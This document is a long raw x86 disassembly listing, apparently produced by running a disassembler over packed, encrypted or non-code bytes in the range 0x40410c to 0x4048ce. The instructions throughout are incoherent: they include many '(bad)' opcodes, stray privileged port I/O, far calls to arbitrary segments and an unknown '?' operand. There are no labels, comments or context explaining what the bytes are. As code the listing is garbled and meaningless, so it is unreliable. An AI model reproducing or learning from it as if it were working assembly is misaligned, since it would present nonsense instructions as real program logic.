  40410c:	imul   ecx,DWORD PTR [edx-0x5be0bf95],0x1aaa81bf
  404116:	mov    ecx,0x7705e699
  40411b:	inc    edi
  40411c:	test   bl,bl
  40411e:	es das 
  404120:	xlat   BYTE PTR ds:[ebx]
  404121:	push   ecx
  404122:	jg     0x4041a2
  404124:	xor    BYTE PTR [ecx],ah
  404126:	or     ebp,DWORD PTR [eax-0xa735c16]
  40412c:	or     esp,DWORD PTR [edi+0x4c2c403c]
  404132:	in     eax,dx
  404133:	or     al,0x13
  404136:	dec    eax
  404137:	add    esp,eax
  404139:	sar    BYTE PTR [edx+0x2f],1
  40413c:	inc    ebp
  40413d:	(bad)  
  40413e:	mov    ah,0x7
  404140:	imul   ebp,DWORD PTR [edi],0xffffffd9
  404143:	cmp    eax,0x8a019da
  404148:	aad    0xfc
  40414a:	jg     0x4041b4
  40414c:	fmul   st(2),st
  40414e:	fsub   DWORD PTR [esi+0x1b370a6f]
  404154:	mov    bh,cl
  404156:	mov    dh,0xd5
  404158:	sbb    esi,esi
  40415a:	out    dx,al
  40415b:	(bad)  
  40415c:	xchg   edi,eax
  40415d:	cdq    
  40415e:	mov    ds:0xff001480,al
  404163:	cs push ds
  404165:	(bad)  
  404166:	addr16 pushf 
  404168:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404169:	rcl    DWORD PTR [edi+0x70],0x70
  40416d:	mov    eax,0xf9af4080
  404172:	popf   
  404173:	xchg   bl,cl
  404175:	push   esi
  404176:	ins    BYTE PTR es:[edi],dx
  404177:	pop    ax
  404179:	dec    edx
  40417a:	adc    dl,cl
  40417c:	(bad)  
  40417d:	(bad)  
  40417e:	fimul  DWORD PTR [ebp+0x73]
  404181:	mov    eax,ds:0xc9d9df6d
  404186:	cs xchg ecx,eax
  404188:	stc    
  404189:	jo     0x4041dd
  40418b:	ja     0x404153
  40418d:	push   edi
  40418e:	aad    0x3b
  404190:	jge    0x4041fa
  404192:	outs   dx,BYTE PTR ds:[esi]
  404193:	pusha  
  404194:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404195:	push   ebp
  404196:	rol    BYTE PTR cs:[ecx+0x5f],0x6f
  40419b:	push   ebp
  40419c:	mov    ecx,0x57e95143
  4041a1:	call   0x3a59:0xb70473e7
  4041a8:	and    al,0x2d
  4041aa:	arpl   ax,dx
  4041ac:	inc    esp
  4041ad:	cli    
  4041ae:	or     ebx,DWORD PTR [ecx+0x64a7dc06]
  4041b4:	mov    ?,WORD PTR [edx+0x53]
  4041b7:	add    eax,0x64e99210
  4041bc:	repz sbb edi,ebx
  4041bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041c0:	lahf   
  4041c1:	aas    
  4041c2:	fmul   QWORD PTR [esp+eiz*8-0x6a]
  4041c6:	ins    BYTE PTR es:[edi],dx
  4041c7:	sub    eax,0x91a5589c
  4041cc:	jecxz  0x4041eb
  4041ce:	xor    BYTE PTR fs:[esi-0x15],dl
  4041d2:	aam    0x28
  4041d4:	test   eax,0x5df9e237
  4041d9:	mov    dl,0x7d
  4041db:	cmp    dl,BYTE PTR [ebp+0x1c126396]
  4041e1:	fcmovnb st,st(3)
  4041e3:	inc    edx
  4041e4:	std    
  4041e5:	jnp    0x40421c
  4041e7:	test   eax,0x20f0773f
  4041ec:	sbb    BYTE PTR [edx+0x4d],bl
  4041ef:	aam    0xd8
  4041f1:	cmp    dl,al
  4041f3:	sbb    DWORD PTR [edx-0x8],eax
  4041f6:	enter  0xf050,0xa8
  4041fa:	shl    BYTE PTR [esi+0x4c],cl
  4041fd:	les    edx,FWORD PTR [eax+edi*4]
  404200:	or     cl,BYTE PTR [edi]
  404202:	das    
  404203:	push   eax
  404204:	inc    esi
  404205:	bound  ecx,QWORD PTR [ebx+0x3d8bdb95]
  40420b:	push   esp
  40420c:	xchg   BYTE PTR [edx+0x3c],cl
  40420f:	jb     0x4041d7
  404211:	test   al,0x85
  404213:	xchg   esi,eax
  404214:	add    eax,0x7b422fc2
  404219:	popf   
  40421a:	sbb    eax,0xdfdb3ceb
  40421f:	sar    DWORD PTR [eax],0x87
  404222:	jae    0x40426e
  404224:	fiadd  WORD PTR fs:[eax-0x70adee8d]
  40422b:	fcmovnu st,st(4)
  40422d:	dec    ebp
  40422e:	inc    ecx
  40422f:	mov    cl,0x83
  404231:	xlat   BYTE PTR ds:[ebx]
  404232:	int3   
  404233:	or     al,0x5e
  404235:	(bad)  
  404236:	fsubrp st(7),st
  404238:	inc    edi
  404239:	mov    BYTE PTR [edx-0x5b],bl
  40423c:	mov    DWORD PTR [eax+0x3f],ecx
  40423f:	or     dh,BYTE PTR [edi+0x62]
  404242:	shr    DWORD PTR [esi],1
  404244:	mov    BYTE PTR [ecx+0x594533c9],bl
  40424a:	es pop es
  40424c:	inc    esp
  40424e:	cmp    ah,BYTE PTR [edi]
  404250:	fwait
  404251:	sub    DWORD PTR [edi-0x54ededf5],ebx
  404257:	ror    DWORD PTR [ecx-0x38],1
  40425a:	mov    bh,0xcc
  40425d:	xchg   esi,eax
  40425e:	jecxz  0x4042af
  404260:	clc    
  404261:	dec    esi
  404262:	pop    ecx
  404264:	and    al,0x65
  404266:	xchg   eax,ebp
  404268:	or     eax,0x76f9a316
  40426d:	sar    DWORD PTR [edx],0x36
  404270:	int    0xfb
  404272:	mov    ds:0xfd222260,al
  404277:	jp     0x40428d
  404279:	push   esi
  40427a:	mov    edi,0x88347e82
  404280:	fiadd  WORD PTR ds:0xac7c459a
  404286:	or     al,0x47
  404288:	xchg   ebx,eax
  404289:	in     al,dx
  40428a:	mov    al,ds:0xd43b32df
  40428f:	xchg   ebx,eax
  404290:	(bad)  
  404291:	(bad)  
  404292:	(bad)  
  404293:	fisttp WORD PTR [ebx]
  404295:	mov    al,0xc2
  404297:	add    al,0xbd
  404299:	or     eax,0xb4ace2c1
  40429e:	xchg   DWORD PTR [ebp+0x6],eax
  4042a1:	pop    ebp
  4042a2:	jge    0x4042cd
  4042a4:	dec    edi
  4042a5:	and    al,0xb9
  4042a7:	jl     0x40426c
  4042a9:	xor    al,0x9e
  4042ab:	ss jae 0x40429f
  4042ae:	mov    ds:0xad2c3e67,al
  4042b3:	xchg   esi,eax
  4042b4:	jg     0x4042a5
  4042b6:	push   edx
  4042b7:	xchg   esp,eax
  4042b8:	shl    bl,1
  4042ba:	or     DWORD PTR [ecx+0x87e6ba2],ebx
  4042c0:	cmp    al,0x44
  4042c2:	aad    0x6e
  4042c4:	cmp    eax,0x50b09d68
  4042c9:	(bad)  
  4042cb:	ficomp DWORD PTR [edi+0x73cf2484]
  4042d1:	cmp    BYTE PTR [ecx],bh
  4042d3:	cld    
  4042d4:	add    ebx,DWORD PTR ds:0x3e5396b0
  4042da:	xchg   BYTE PTR [esp+edi*4],ah
  4042dd:	add    eax,0x24dd1c1e
  4042e2:	mov    BYTE PTR ds:0xa139cf5e,bh
  4042e8:	pop    ebp
  4042e9:	rol    DWORD PTR [eax+ebx*1-0x3f2bd045],cl
  4042f0:	(bad)  
  4042f1:	aad    0x54
  4042f3:	cld    
  4042f4:	sub    dl,BYTE PTR [edi+0x2f]
  4042f7:	sbb    ecx,DWORD PTR [esi+0x47aa95]
  4042fd:	popf   
  4042fe:	push   ebx
  4042ff:	inc    ebp
  404300:	mov    al,ds:0xde2af79e
  404305:	das    
  404306:	inc    ebx
  404307:	rcr    BYTE PTR [eax+0x133b40e6],cl
  40430d:	rcr    BYTE PTR [ebx+0x0],cl
  404310:	aaa    
  404311:	in     al,dx
  404312:	or     esi,DWORD PTR [eax-0x33]
  404315:	and    ch,dh
  404317:	call   DWORD PTR [eax+0x1e4daf11]
  40431d:	or     al,0x16
  40431f:	pop    esi
  404320:	mov    cl,0xb6
  404322:	mov    ebx,0xe637d0fc
  404327:	sbb    DWORD PTR [ebx-0x7686a90e],ebp
  40432d:	aad    0x6f
  40432f:	xchg   edi,eax
  404330:	mov    cl,0x5d
  404332:	popa   
  404333:	xchg   edi,eax
  404334:	jp     0x4042f3
  404336:	mov    eax,0x6e83ba16
  40433b:	jl     0x4043b0
  40433d:	lea    ebx,[esi+edx*2+0x5]
  404341:	xchg   ch,bh
  404343:	mov    eax,0x5338c876
  404348:	push   0x2c
  40434a:	popf   
  40434b:	out    0xdb,eax
  40434d:	stos   BYTE PTR es:[edi],al
  40434e:	cli    
  40434f:	shl    dh,0xae
  404352:	loope  0x404314
  404354:	loop   0x404326
  404356:	data16 mov dl,BYTE PTR [ecx-0x5fe07592]
  40435d:	ficom  WORD PTR [ebp+0x1e]
  404360:	aaa    
  404361:	(bad)  
  404362:	mov    ch,0xbf
  404364:	add    DWORD PTR [ecx+edx*1-0x7e],ebx
  404368:	adc    eax,0xa7d76b88
  40436d:	aam    0x9e
  40436f:	and    edx,DWORD PTR [ecx+0x7eb70a87]
  404375:	sbb    BYTE PTR [edx],dh
  404377:	jno    0x404349
  404379:	inc    eax
  40437a:	mov    ebp,0xb397fa60
  40437f:	jns    0x4043e3
  404381:	mov    al,ds:0xa96d4ba9
  404386:	xor    bh,BYTE PTR [ebx-0x5bd11a60]
  40438c:	push   ecx
  40438d:	fmul   st(5),st
  40438f:	push   eax
  404390:	loop   0x4043fb
  404392:	test   BYTE PTR [ebx+ebp*1-0x4b984d74],dl
  404399:	xor    eax,0x37d924dd
  40439e:	mov    eax,0xae273def
  4043a3:	jo     0x4043b9
  4043a5:	(bad)  
  4043a6:	sbb    al,0x41
  4043a8:	jge    0x404401
  4043aa:	in     al,dx
  4043ab:	sub    BYTE PTR [edi+0x2a83bc95],0xc8
  4043b2:	sub    BYTE PTR [edx],0xb6
  4043b5:	out    0xc7,al
  4043b7:	mov    ecx,0x4d5860a
  4043bc:	in     eax,dx
  4043bd:	mov    edx,0x6cd063fd
  4043c2:	xchg   DWORD PTR [esi],edx
  4043c4:	retf   
  4043c5:	stos   BYTE PTR es:[edi],al
  4043c6:	and    ch,cl
  4043c8:	and    bl,dl
  4043ca:	in     al,0xda
  4043cc:	fcom   DWORD PTR [ecx+0x6391af5e]
  4043d2:	lea    ebx,[esi+0x1c2a115]
  4043d8:	or     eax,0x2f045b8
  4043dd:	leave  
  4043de:	xor    DWORD PTR [edx],0x77b35682
  4043e4:	mov    al,0x4e
  4043e6:	stc    
  4043e7:	jnp    0x404456
  4043e9:	or     eax,ebx
  4043eb:	mov    bh,0x21
  4043ed:	xor    dl,al
  4043ef:	pop    ebx
  4043f0:	cmp    dl,bh
  4043f2:	sub    DWORD PTR cs:[eax],ebp
  4043f5:	add    BYTE PTR [edx+0x5f066b48],bh
  4043fb:	sbb    esi,DWORD PTR [edi-0x7924514a]
  404401:	or     eax,0x78e3d616
  404406:	leave  
  404407:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404408:	out    0x9b,al
  40440a:	sub    DWORD PTR [ecx+ecx*8-0x7e],ebx
  40440e:	jp     0x4043c5
  404410:	aas    
  404411:	int3   
  404412:	xchg   esp,eax
  404413:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404414:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  404416:	and    eax,0xd4e86307
  40441b:	test   al,0xaf
  40441d:	xchg   BYTE PTR [eax],bh
  40441f:	aam    0x9b
  404421:	xchg   ebp,eax
  404422:	clc    
  404423:	xor    al,0xc7
  404425:	jbe    0x404499
  404427:	inc    edi
  404428:	mov    dl,0x1
  40442a:	ss je  0x40449c
  40442d:	icebp  
  40442e:	(bad)  
  40442f:	rol    bl,cl
  404431:	xchg   eax,esi
  404433:	push   ebx
  404434:	lea    esi,[edi]
  404436:	retf   
  404437:	hlt    
  404438:	mov    al,0x1a
  40443a:	rol    BYTE PTR [esi],1
  40443c:	mov    cl,0xf0
  40443e:	xchg   esi,eax
  40443f:	aam    0x3e
  404441:	xchg   BYTE PTR [esi+0x5d],al
  404444:	pushf  
  404445:	clc    
  404446:	and    eax,0x9f269f48
  40444b:	sbb    DWORD PTR [ebx+0xc366314],eax
  404451:	ds push ebx
  404453:	adc    ebp,DWORD PTR [esi]
  404455:	scas   eax,DWORD PTR es:[edi]
  404456:	lds    edi,FWORD PTR [ebp+0xec78c97]
  40445c:	retf   0xff25
  40445f:	mov    esi,0xbb111c66
  404464:	sar    DWORD PTR [esi+0x5],cl
  404467:	sbb    eax,0xcfbb6902
  40446c:	mov    edi,0xa58a90b2
  404471:	sbb    BYTE PTR [esi],ah
  404473:	ins    BYTE PTR es:[edi],dx
  404474:	adc    DWORD PTR [ecx-0x4318bb],esi
  40447a:	mov    ah,BYTE PTR [esi+0x8b1fee0]
  404480:	push   ds
  404481:	sub    DWORD PTR [eax+0x32],ebp
  404484:	cmp    dh,ch
  404486:	sub    ecx,DWORD PTR [esi-0x38]
  404489:	fldenv [esi+0x21d3f8ba]
  40448f:	inc    ecx
  404490:	enter  0x4432,0x4e
  404494:	icebp  
  404495:	out    0xe1,eax
  404497:	mov    BYTE PTR [eax+0x42],bh
  40449a:	jno    0x404489
  40449c:	(bad)  
  40449d:	repnz stc 
  40449f:	xor    bh,BYTE PTR [esi]
  4044a1:	jge    0x404475
  4044a3:	and    al,bl
  4044a5:	lods   al,BYTE PTR ds:[esi]
  4044a6:	test   eax,0xe0247fb1
  4044ab:	pop    es
  4044ac:	retf   0xa474
  4044af:	dec    eax
  4044b0:	cwde   
  4044b1:	mov    cl,0x63
  4044b3:	mov    al,ds:0x70a82990
  4044b8:	loope  0x40443f
  4044ba:	and    ch,bl
  4044bc:	mov    esp,0x9191fa24
  4044c1:	(bad)  
  4044c2:	push   edx
  4044c3:	dec    edi
  4044c4:	pop    ds
  4044c5:	push   esp
  4044c6:	repz sbb eax,0xff93410e
  4044cc:	mov    eax,DWORD PTR [ebx+0xd]
  4044cf:	jno    0x4044d3
  4044d1:	cmp    BYTE PTR [edi-0x80],ah
  4044d4:	inc    esi
  4044d5:	outs   dx,DWORD PTR ds:[esi]
  4044d6:	sbb    bl,BYTE PTR [esi+0x4c]
  4044d9:	fxch   st(5)
  4044db:	jmp    0x70f1f1e0
  4044e0:	shl    DWORD PTR [ebx+0x26],0xc1
  4044e4:	setb   BYTE PTR [ebx-0x4e]
  4044e8:	mov    ah,0xe7
  4044ea:	sbb    BYTE PTR [edi],ah
  4044ec:	inc    esi
  4044ed:	dec    ecx
  4044ee:	mov    ebp,0x54828766
  4044f3:	mov    cl,0xae
  4044f5:	lea    edx,[ecx-0x6a]
  4044f8:	call   0xf5c2:0x10a75d52
  4044ff:	inc    ebp
  404500:	mov    DWORD PTR [ecx-0x72],0x4b9538f0
  404507:	xlat   BYTE PTR ds:[ebx]
  404508:	mov    cl,0x46
  40450a:	fldcw  WORD PTR [eax-0x2988c377]
  404510:	xchg   esi,eax
  404511:	(bad)  
  404512:	ds and eax,0x601c3252
  404518:	dec    edx
  404519:	iret   
  40451a:	shr    BYTE PTR [ebp+eax*4+0x440d9653],cl
  404521:	mov    ebx,0xa40ca7ea
  404526:	xchg   esi,eax
  404527:	mov    esi,0x996dacc2
  40452c:	lods   al,BYTE PTR ds:[esi]
  40452d:	(bad)  
  40452e:	daa    
  40452f:	mov    ch,0x29
  404531:	clc    
  404532:	sbb    eax,0xfbab205a
  404537:	imul   ebx,DWORD PTR [ecx+0x2c],0xffffffab
  40453b:	test   BYTE PTR [esi-0x28],bh
  40453e:	inc    esp
  40453f:	push   ebx
  404540:	jg     0x4044d2
  404542:	ret    
  404543:	inc    esp
  404544:	stos   DWORD PTR es:[edi],eax
  404545:	mov    WORD PTR [eax+0x36],es
  404548:	add    al,0x99
  40454a:	adc    edi,edx
  40454c:	aas    
  40454d:	dec    esp
  40454e:	(bad)  
  40454f:	mov    esi,0xcf58591a
  404554:	jns    0x4044dc
  404556:	adc    esp,DWORD PTR [ebx+esi*8-0xe]
  40455a:	jmp    0x404502
  40455c:	pmullw mm3,mm7
  40455f:	push   esi
  404560:	add    eax,ebp
  404562:	mov    cl,0x7f
  404564:	pop    ss
  404565:	(bad)  
  404566:	cli    
  404567:	lea    ebx,[esi+0x66]
  40456a:	pop    eax
  40456b:	mov    bh,0x21
  40456d:	cmp    esi,DWORD PTR [ecx+0x4c]
  404570:	xchg   esi,eax
  404571:	mov    ebp,0x56482c4b
  404576:	and    ch,BYTE PTR [eax+0x4b3ab1e8]
  40457c:	mov    ch,0x1
  40457e:	pop    ecx
  40457f:	mov    esp,0x60c1d276
  404584:	fiadd  DWORD PTR [edx+0x627acebb]
  40458a:	shr    DWORD PTR [ebx+eiz*2+0xc],1
  40458e:	imul   ebx
  404590:	mov    edi,0x7dc789f7
  404595:	dec    ebp
  404596:	or     edi,eax
  404598:	pop    es
  404599:	and    al,0x6f
  40459b:	and    esp,esi
  40459d:	call   0x5731:0x2fea6029
  4045a4:	sar    eax,1
  4045a6:	inc    esp
  4045a7:	pop    edi
  4045a8:	xchg   edi,eax
  4045a9:	push   0xfd1f420d
  4045ae:	xor    ch,ah
  4045b0:	jno    0x404597
  4045b2:	xchg   edx,eax
  4045b3:	push   0xffffff81
  4045b5:	mov    edi,0xd73ab655
  4045ba:	out    0xa9,al
  4045bc:	cld    
  4045bd:	and    BYTE PTR [ebx+0x8],ch
  4045c0:	add    edx,DWORD PTR [ebx]
  4045c2:	add    eax,eax
  4045c4:	sbb    al,0xf4
  4045c6:	pop    ds
  4045c7:	sub    al,ah
  4045c9:	divps  xmm6,XMMWORD PTR [edx+0x474c013]
  4045d0:	call   0x29eb:0x5fec8739
  4045d7:	ror    BYTE PTR [ecx+eax*8],cl
  4045da:	clc    
  4045db:	adc    al,0xb0
  4045dd:	iret   
  4045de:	repz out dx,al
  4045e0:	test   al,0x90
  4045e2:	push   ecx
  4045e3:	pop    eax
  4045e4:	enter  0xfce4,0x4d
  4045e8:	aas    
  4045e9:	xor    DWORD PTR [ebx+0x361551a1],esp
  4045ef:	iret   
  4045f0:	std    
  4045f1:	out    0x8c,eax
  4045f3:	xlat   BYTE PTR ds:[ebx]
  4045f4:	lods   eax,DWORD PTR ds:[esi]
  4045f5:	fdiv   DWORD PTR [ebx-0x2a]
  4045f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045f9:	leave  
  4045fa:	mov    al,ds:0x500dfd22
  4045ff:	mov    ch,0xad
  404601:	mov    ss,edx
  404603:	cmc    
  404604:	outs   dx,DWORD PTR ds:[esi]
  404605:	xchg   ebp,eax
  404606:	push   edi
  404607:	fimul  DWORD PTR [esi-0x49fed64c]
  40460d:	jne    0x404650
  40460f:	outs   dx,DWORD PTR ds:[esi]
  404610:	fs mov dl,ch
  404613:	or     al,0x6
  404615:	or     DWORD PTR [edx-0x2fd34220],0xfffffff2
  40461c:	xcrypt-ctr (bad)
  40461d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40461e:	pop    ds
  40461f:	ds iret 
  404621:	inc    esp
  404622:	inc    esi
  404623:	cmp    eax,0x358c460d
  404628:	ror    BYTE PTR [ecx+0x5e],1
  40462b:	fdivr  QWORD PTR [ebx]
  40462d:	nop
  40462e:	clc    
  40462f:	jl     0x404691
  404631:	or     al,0x0
  404633:	sbb    eax,0x937186fe
  404638:	mov    dh,0xef
  40463a:	cs aaa 
  40463c:	aas    
  40463d:	sub    BYTE PTR [ebx],0xb5
  404640:	arpl   WORD PTR [ebx+esi*8+0x38eb42f],bp
  404647:	xor    BYTE PTR [edi+0x50711c3d],dh
  40464d:	sbb    edx,DWORD PTR [eax-0x512c266]
  404653:	push   ss
  404654:	clc    
  404655:	dec    edx
  404656:	outs   dx,DWORD PTR ds:[esi]
  404657:	js     0x4045e6
  404659:	loopne 0x40467c
  40465b:	sub    eax,0x57d0bebd
  404660:	sbb    al,0x60
  404662:	mov    cl,0xcf
  404664:	cmc    
  404665:	call   0x96be:0xae9a0a35
  40466c:	cs (bad) 
  40466e:	test   BYTE PTR [ecx+0x16a08ab9],0x18
  404675:	push   0x1
  404677:	aaa    
  404678:	push   edi
  404679:	adc    DWORD PTR [edx-0x3e],eax
  40467c:	sbb    dl,BYTE PTR [esi-0x59eba46e]
  404682:	push   ss
  404683:	cmc    
  404684:	or     al,0xf2
  404686:	sub    esi,ecx
  404688:	ins    BYTE PTR es:[edi],dx
  404689:	jmp    0xe1fa:0x70cdafe9
  404690:	mov    eax,ds:0x260fb637
  404695:	aas    
  404696:	dec    esp
  404697:	xlat   BYTE PTR ds:[ebx]
  404698:	lods   al,BYTE PTR ds:[esi]
  404699:	shl    DWORD PTR [ebp+0x594709c5],0xd9
  4046a0:	jp     0x4046e4
  4046a2:	(bad)  
  4046a3:	xlat   BYTE PTR ds:[ebx]
  4046a4:	fisub  WORD PTR ss:[ebx-0xd]
  4046a8:	out    dx,eax
  4046a9:	add    al,0x5c
  4046ab:	push   esi
  4046ac:	mov    cl,0xae
  4046ae:	add    DWORD PTR [ecx-0x5c52ce6e],ebp
  4046b4:	adc    DWORD PTR [ecx+0x734efe6d],esp
  4046ba:	xchg   ebp,eax
  4046bb:	sub    al,0x2b
  4046bd:	xchg   edi,eax
  4046be:	ins    DWORD PTR es:[edi],dx
  4046bf:	repnz pop edx
  4046c1:	dec    esp
  4046c2:	leave  
  4046c3:	inc    edx
  4046c4:	add    al,0x29
  4046c6:	addr16 cmc 
  4046c8:	sub    cl,BYTE PTR [eax]
  4046ca:	adc    ebp,ebp
  4046cc:	cmp    dl,BYTE PTR [ebp+0x18]
  4046cf:	lods   al,BYTE PTR ds:[esi]
  4046d0:	mov    cs,WORD PTR [ecx-0x21fca54b]
  4046d6:	xchg   ecx,eax
  4046d7:	sbb    eax,0x2cfb2771
  4046dc:	loope  0x40469f
  4046de:	arpl   WORD PTR ds:[edi+ebp*8-0x2952d894],bp
  4046e6:	push   cs
  4046e7:	scas   al,BYTE PTR es:[edi]
  4046e8:	adc    DWORD PTR [ebx],0xffffff9f
  4046eb:	jb     0x40468b
  4046ed:	add    al,0xa6
  4046ef:	imul   esp,DWORD PTR [ebp-0x5],0xffffffaf
  4046f3:	xchg   ecx,eax
  4046f4:	outs   dx,BYTE PTR ds:[esi]
  4046f5:	loope  0x40470c
  4046f7:	sub    ebp,DWORD PTR fs:[edi]
  4046fa:	inc    esp
  4046fb:	pusha  
  4046fc:	jle    0x404690
  4046fe:	pop    ds
  4046ff:	cmp    cl,BYTE PTR [ebx+0x53b3f23]
  404705:	mov    ch,0xec
  404707:	mov    eax,ds:0xd0b60bca
  40470c:	repnz or ecx,esi
  40470f:	aas    
  404710:	outs   dx,BYTE PTR ds:[esi]
  404711:	cmp    DWORD PTR [ecx+0x17],edi
  404714:	out    dx,eax
  404715:	push   esp
  404716:	jns    0x4046c0
  404718:	inc    ecx
  404719:	mov    al,ds:0x9241b4fa
  40471e:	les    ecx,FWORD PTR [edi+0x44b580d1]
  404724:	ror    BYTE PTR [ebp+esi*4+0x10f24a2],cl
  40472b:	pushf  
  40472c:	loope  0x404741
  40472e:	sbb    eax,0xd7f699eb
  404733:	lock test eax,0xff64af7a
  404739:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40473a:	out    dx,eax
  40473b:	jmp    0x8b4e3d21
  404740:	mov    ebx,0x9ee8e475
  404745:	mov    DWORD PTR [edx],ebp
  404747:	leave  
  404748:	jge    0x40476c
  40474a:	dec    esp
  40474b:	pop    ds
  40474c:	mov    dl,0xba
  40474e:	jns    0x4047ad
  404750:	cmp    BYTE PTR [edx-0x7a67979a],dl
  404756:	jb     0x4047ab
  404758:	test   ebp,0xbd21b479
  40475e:	in     eax,dx
  40475f:	inc    BYTE PTR [eax+0x1b7e219]
  404765:	mov    al,0xc5
  404767:	adc    eax,0x45acc3c8
  40476c:	cmovae ebp,DWORD PTR [ecx]
  40476f:	into   
  404770:	pop    ss
  404771:	pop    esp
  404772:	test   al,0xa3
  404774:	xchg   esi,eax
  404775:	xor    eax,0xfc2ac91d
  40477a:	sahf   
  40477b:	test   eax,0x16f3751c
  404780:	lods   al,BYTE PTR ds:[esi]
  404781:	mov    al,0xfa
  404783:	pop    ds
  404784:	popa   
  404785:	mov    bh,0x99
  404787:	aas    
  404788:	sti    
  404789:	fwait
  40478a:	xchg   ebp,eax
  40478b:	mov    cl,0x6f
  40478d:	push   ebx
  40478e:	fld    QWORD PTR [eax]
  404790:	xchg   esi,eax
  404791:	sbb    BYTE PTR [eax],bh
  404793:	pusha  
  404794:	pop    ebp
  404795:	stos   DWORD PTR es:[edi],eax
  404796:	pop    esp
  404797:	mov    ebx,0x8e87f80b
  40479c:	and    ah,BYTE PTR [ebp+0x4a]
  40479f:	xor    BYTE PTR [edi-0x58d07b80],bl
  4047a5:	stos   DWORD PTR es:[edi],eax
  4047a6:	dec    ebp
  4047a7:	and    esp,DWORD PTR [eax]
  4047a9:	bound  esi,QWORD PTR [edx-0x5f]
  4047ac:	and    DWORD PTR [esi-0x37a84184],ecx
  4047b2:	pop    esp
  4047b3:	cmc    
  4047b4:	out    dx,eax
  4047b5:	mov    cl,0x4b
  4047b7:	cmc    
  4047b8:	imul   eax,DWORD PTR [edi+0x19],0x3a
  4047bc:	cli    
  4047bd:	ds jae 0x4047f0
  4047c0:	dec    eax
  4047c1:	xor    al,0xdd
  4047c3:	into   
  4047c4:	mov    ebx,0x4f37162b
  4047c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047ca:	(bad)  
  4047cb:	push   ebx
  4047cc:	cmp    al,0x9
  4047ce:	xlat   BYTE PTR ds:[ebx]
  4047cf:	cmp    BYTE PTR [ebp+0x25],bh
  4047d2:	xor    eax,0x6fce8a9b
  4047d7:	stos   DWORD PTR es:[edi],eax
  4047d8:	cld    
  4047d9:	push   ds
  4047da:	retf   
  4047db:	jno    0x4047fd
  4047dd:	outs   dx,DWORD PTR ds:[esi]
  4047de:	adc    BYTE PTR ds:0x7f4f5d6f,ah
  4047e4:	jg     0x40479a
  4047e6:	cdq    
  4047e7:	dec    ebx
  4047e8:	out    0xbd,al
  4047ea:	mov    ah,0xf0
  4047ec:	xor    ch,BYTE PTR [esi+0x57]
  4047ef:	xor    BYTE PTR [eax-0x26b5ca38],0x1d
  4047f6:	dec    edi
  4047f7:	adc    BYTE PTR [edx],al
  4047f9:	mov    ebp,0xece9cd8c
  4047fe:	jae    0x4047aa
  404800:	leave  
  404801:	inc    edx
  404802:	imul   DWORD PTR [edi]
  404804:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404805:	pop    ebp
  404806:	xchg   ebx,eax
  404807:	adc    BYTE PTR [edi-0x5c9a91d4],ch
  40480d:	inc    esi
  40480e:	mov    ds,WORD PTR [edi-0x55]
  404811:	add    al,0x97
  404813:	sbb    al,0xee
  404815:	(bad)  
  404816:	adc    eax,0xcea6e7e1
  40481b:	sbb    eax,0x50aee9b4
  404820:	ret    
  404821:	sbb    DWORD PTR [eax+0x2f],edi
  404824:	(bad)  
  404825:	rol    DWORD PTR [ebp+0x1a],cl
  404828:	test   al,0xf9
  40482a:	dec    edx
  40482b:	sub    BYTE PTR [ebx+ecx*2-0x63b65119],0xc9
  404833:	sbb    al,0x83
  404835:	mov    ah,0x2a
  404837:	cmp    al,0x75
  404839:	dec    eax
  40483a:	mov    al,ds:0xddae42cd
  40483f:	lds    esp,FWORD PTR [ecx-0xd]
  404842:	xor    esp,DWORD PTR [esi+0x5d]
  404845:	cli    
  404846:	in     eax,0xc1
  404848:	mov    dl,0x98
  40484a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40484b:	fs and al,0x8c
  40484e:	into   
  40484f:	in     eax,dx
  404850:	ret    
  404851:	iret   
  404852:	mov    es,WORD PTR [ecx-0x6c]
  404855:	xor    bh,ch
  404857:	jo     0x40480e
  404859:	pop    ss
  40485a:	dec    edi
  40485b:	sar    DWORD PTR [edi],cl
  40485d:	and    DWORD PTR [edi+eiz*4-0x68],eax
  404861:	cmp    eax,0xa07c43b0
  404866:	jl     0x404841
  404868:	jne    0x404854
  40486a:	pop    ecx
  40486b:	adc    BYTE PTR [ebx-0x7996e37a],ch
  404871:	inc    ebx
  404872:	sti    
  404873:	(bad)  
  404874:	out    0x59,eax
  404876:	sub    esp,ecx
  404878:	mov    ebp,DWORD PTR [eax-0x678573f5]
  40487e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40487f:	xchg   esi,eax
  404880:	xchg   edi,eax
  404881:	ror    dh,cl
  404883:	mov    DWORD PTR [ebx-0x34],ebp
  404886:	mov    dh,BYTE PTR [esi]
  404888:	repz or ebp,DWORD PTR [edx]
  40488b:	xor    eax,0x13e3af75
  404890:	test   al,0xf
  404892:	xor    DWORD PTR [edi+ebx*2+0x53],edx
  404896:	inc    eax
  404897:	pop    es
  404898:	dec    esi
  404899:	xor    esp,DWORD PTR [ebx+edx*1+0x5f]
  40489d:	fadd   DWORD PTR [ecx+0x30999fe7]
  4048a3:	sub    BYTE PTR [esi-0xa],ch
  4048a6:	sahf   
  4048a7:	loop   0x404835
  4048a9:	dec    esp
  4048aa:	xchg   ebp,eax
  4048ab:	leave  
  4048ac:	mov    gs,WORD PTR [eax-0x66]
  4048af:	dec    edx
  4048b0:	gs xchg esi,eax
  4048b2:	cmc    
  4048b3:	cmp    al,0x28
  4048b5:	cmp    ebx,DWORD PTR [esi]
  4048b7:	push   edi
  4048b8:	mov    eax,0xf142806a
  4048bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048be:	jmp    FWORD PTR [ebx-0x5e30950c]
  4048c4:	jmp    0x404899
  4048c6:	adc    al,0x49
  4048c8:	fdiv   QWORD PTR [esi-0x4a]
  4048cb:	pop    ecx
  4048cc:	inc    edx
  4048cd:	pop    eax
  4048ce:	inc    esp
